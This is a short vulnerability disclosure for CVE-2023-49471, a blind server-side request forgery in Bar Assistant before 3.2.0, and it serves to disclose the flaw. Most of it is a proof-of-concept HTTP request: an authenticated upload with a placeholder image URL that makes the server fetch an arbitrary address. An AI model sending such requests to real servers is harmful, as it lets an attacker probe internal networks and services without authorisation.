# CVE-2023-49471

#### Vulnerability Type
Blind SSRF

#### Affected Product and Version
Bar assistant < 3.2.0

#### Attack Vector
Authenticated users upload an image by URL to the application.

#### Description
The application does not validate a parameter before making a request through Image::make(), which could allow perpetrator to perform Server-side Request Forgery attack.

#### PoC
```
POST /bar/api/images HTTP/1.1

Host: localhost:3000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------8290129562507108753887567115

Content-Length: 459

Referer: http://localhost:3000/cocktails/form

Origin: http://localhost:3000

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

authorization: Bearer 1|A3dV5SfOEqxNOY8UQmz2wDqA6ssdtBGHoVyjCFTR186abc29

Connection: close



-----------------------------8290129562507108753887567115

Content-Disposition: form-data; name="images[0][image_url]"



http://<target>/<path>

-----------------------------8290129562507108753887567115

Content-Disposition: form-data; name="images[0][copyright]"





-----------------------------8290129562507108753887567115

Content-Disposition: form-data; name="images[0][sort]"



1

-----------------------------8290129562507108753887567115--
```
